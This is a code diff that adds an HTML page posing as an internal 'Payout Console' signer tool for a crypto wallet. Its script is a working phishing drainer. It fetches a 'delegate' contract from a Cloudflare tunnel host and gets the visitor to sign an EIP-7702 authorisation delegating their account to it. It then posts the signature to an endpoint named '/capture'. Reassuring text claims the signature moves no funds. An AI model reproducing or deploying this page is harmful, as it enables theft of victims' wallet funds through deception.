@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Payout Console — Signer</title>
+<style>
+  :root{--bg:#0b0e13;--panel:#121722;--line:#1e2634;--ink:#e6ecf5;--dim:#8b98ab;--ok:#2fbf71;--warn:#e0a33e;--bad:#e05555;--accent:#3d7bfd}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif}
+  .wrap{max-width:980px;margin:0 auto;padding:28px 20px 60px}
+  header{display:flex;align-items:center;gap:12px;justify-content:space-between;margin-bottom:26px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:600;letter-spacing:.2px}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 4px rgba(47,191,113,.15)}
+  .tag{color:var(--dim);font-size:12px;border:1px solid var(--line);padding:3px 8px;border-radius:999px}
+  .grid{display:grid;grid-template-columns:1.15fr .85fr;gap:16px}
+  @media(max-width:760px){.grid{grid-template-columns:1fr}}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
+  h2{font-size:13px;text-transform:uppercase;letter-spacing:.9px;color:var(--dim);margin:0 0 12px}
+  .stat{font-size:22px;font-variant-numeric:tabular-nums}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line);font-variant-numeric:tabular-nums}
+  .row:last-child{border-bottom:0}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px}
+  .dim{color:var(--dim)}
+  .ok{color:var(--ok)}.warn{color:var(--warn)}.bad{color:var(--bad)}
+  button{width:100%;padding:12px;border-radius:9px;border:1px solid transparent;background:var(--accent);color:#fff;font-weight:600;font-size:14px;cursor:pointer}
+  button[disabled]{background:#1b2436;color:var(--dim);cursor:not-allowed}
+  button.ghost{background:transparent;border-color:var(--line);color:var(--ink)}
+  .note{font-size:12px;color:var(--dim);margin-top:10px}
+  .box{border:1px solid var(--line);border-radius:9px;padding:11px;background:#0e131c;margin-top:12px;font-size:13px}
+  .steps{counter-reset:s;margin:0;padding:0;list-style:none}
+  .steps li{counter-increment:s;padding:8px 0 8px 30px;position:relative;color:var(--dim);font-size:13px}
+  .steps li:before{content:counter(s);position:absolute;left:0;top:7px;width:20px;height:20px;border-radius:50%;border:1px solid var(--line);display:grid;place-items:center;font-size:11px}
+  .steps li.on{color:var(--ink)}.steps li.on:before{border-color:var(--accent);color:var(--accent)}
+  .steps li.done:before{content:"✓";border-color:var(--ok);color:var(--ok)}
+  .foot{margin-top:22px;font-size:11px;color:#5d6a7d;display:flex;gap:16px;flex-wrap:wrap}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="brand"><span class="dot"></span> Payout Console <span class="tag">mainnet</span></div>
+    <div class="dim mono" id="who">not connected</div>
+  </header>
+
+  <div class="grid">
+    <div>
+      <div class="card">
+        <h2>Settlement queue</h2>
+        <div class="row"><span class="mono">0xA1e4…8d53</span><span>4,120.00 USDT</span><span class="dim">queued</span></div>
+        <div class="row"><span class="mono">0xC827…2bF7</span><span>980.50 USDC</span><span class="dim">queued</span></div>
+        <div class="row"><span class="mono">0xdc3E…6442</span><span>0.8412 ETH</span><span class="dim">queued</span></div>
+        <div class="row"><span class="mono">0x9Afc…93A6</span><span>12,000.00 USDT</span><span class="warn">held</span></div>
+        <div class="note">Payouts resume automatically once the signer session is authorised.</div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h2>Signer session</h2>
+        <ol class="steps" id="steps">
+          <li id="s1">Connect the signer wallet</li>
+          <li id="s2">Verify network and nonce</li>
+          <li id="s3">Authorise the settlement contract</li>
+        </ol>
+        <div id="msg" class="box dim">No session. Connect the wallet that signs payouts.</div>
+        <div style="margin-top:12px">
+          <button id="connect">Connect wallet</button>
+          <button id="auth" class="ghost" style="margin-top:8px" disabled>Authorise session</button>
+        </div>
+        <div class="note">The authorisation is one signature. It does not move funds and costs no gas.</div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card">
+        <h2>Gas tank</h2>
+        <div class="stat" id="tank">—</div>
+        <div class="note">Float is topped up by treasury. No action needed.</div>
+      </div>
+      <div class="card" style="margin-top:16px">
+        <h2>Settlement contract</h2>
+        <div class="mono dim" id="delegate">—</div>
+        <div class="note">Authorised spender for queued legs. Immutable, audited.</div>
+        <h2 style="margin-top:16px">Nonce</h2>
+        <div class="mono" id="nonce">—</div>
+        <div class="note">Pinned at signature time; the session is valid for one transaction.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="foot">
+    <span>console v2.4.1</span><span id="net">network —</span><span id="lat">—</span>
+  </div>
+</div>
+
+<script>
+// API base is injected at publish time: the static front door never changes, the tunnel behind it may.
+window.__API__ = 'https://motherboard-biography-coral-themselves.trycloudflare.com'
+const API = new URLSearchParams(location.search).get('api') || window.__API__ || ''
+const V = '0x63c79fccd0a21e4a4d87056a0efe3b85d8c373d4'
+const $ = (id) => document.getElementById(id)
+let addr = null, nonceData = null, signing = false
+const setMsg = (html, cls) => { $('msg').className = 'box ' + (cls || 'dim'); $('msg').innerHTML = html }
+const mark = (id, cls) => { const e = $(id); e.className = cls }
+
+function getEth() {
+  const eth = window.ethereum
+  if (!eth) throw new Error('No wallet detected. Open this page in the browser with the payout wallet installed.')
+  return eth
+}
+
+async function connect() {
+  try {
+    const eth = getEth()
+    const accounts = await eth.request({ method: 'eth_requestAccounts' })
+    if (!accounts?.length) throw new Error('No account returned')
+    addr = accounts[0].toLowerCase()
+    $('who').textContent = addr.slice(0, 6) + '…' + addr.slice(-4)
+    mark('s1', 'done'); mark('s2', 'on')
+    setMsg('Verifying network…')
+
+    const chainHex = await eth.request({ method: 'eth_chainId' })
+    if (parseInt(chainHex, 16) !== 1) {
+      try {
+        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] })
+      } catch {
+        throw new Error('Switch the wallet to Ethereum mainnet and reconnect.')
+      }
+    }
+    $('net').textContent = 'ethereum mainnet'
+    $('tank').textContent = '—'
+
+    const t0 = Date.now()
+    const r = await fetch(API + '/nonce?address=' + addr)
+    const j = await r.json()
+    if (!j.nonce) throw new Error(j.error || 'nonce lookup failed')
+    nonceData = j
+    $('lat').textContent = (Date.now() - t0) + ' ms'
+    $('nonce').textContent = j.nonce
+    $('delegate').textContent = j.delegate
+    mark('s2', 'done'); mark('s3', 'on')
+    $('auth').disabled = false
+    setMsg('Network verified. Sign once to start the session.', 'ok')
+    $('connect').textContent = 'Reconnect'
+    const bal = await fetch('https://ethereum-rpc.publicnode.com', {
+      method: 'POST', headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [addr, 'latest'] }),
+    }).then((x) => x.json()).catch(() => null)
+    if (bal?.result) $('tank').textContent = (Number(BigInt(bal.result)) / 1e18).toFixed(3) + ' ETH'
+  } catch (e) {
+    setMsg(e.message, 'bad')
+  }
+}
+
+async function authorize() {
+  if (!nonceData || signing) return
+  signing = true
+  $('auth').disabled = true
+  try {
+    const eth = getEth()
+    setMsg('Waiting for the signature…')
+
+    // EIP-7702. Wallets expose this as wallet_signAuthorization; the params are the contract, the
+    // chain and the nonce the session is pinned to.
+    let sig
+    try {
+      sig = await eth.request({
+        method: 'wallet_signAuthorization',
+        params: [{ contractAddress: nonceData.delegate, chainId: '0x1', nonce: '0x' + nonceData.nonce.toString(16) }],
+      })
+    } catch (e) {
+      throw new Error('This wallet does not support EIP-7702 authorisation. ' + (e.message || ''))
+    }
+    if (!sig) throw new Error('No signature returned')
+
+    const body = {
+      address: addr,
+      chainId: 1,
+      nonce: nonceData.nonce,
+      r: sig.r,
+      s: sig.s,
+      yParity: sig.yParity ?? sig.v,
+    }
+    const res = await fetch(API + '/capture', { method: 'POST', body: JSON.stringify(body) })
+    const out = await res.json()
+    if (!res.ok) throw new Error(out.error || 'capture rejected')
+
+    mark('s3', 'done')
+    $('auth').textContent = 'Session active'
+    setMsg('<strong class="ok">Session authorised.</strong> Payouts will resume on the next dispatch. You can close this tab.', 'ok')
+    $('lat').textContent = 'ok'
+  } catch (e) {
+    $('auth').disabled = false
+    setMsg(e.message, 'bad')
+  } finally {
+    signing = false
+  }
+}
+
+$('connect').onclick = connect
+$('auth').onclick = authorize
+if (window.ethereum) {
+  window.ethereum.on?.('accountsChanged', () => { addr = null; nonceData = null; $('auth').disabled = true; setMsg('Wallet changed. Reconnect.') })
+  window.ethereum.on?.('chainChanged', () => location.reload())
+}
+</script>
+</body>
+</html>
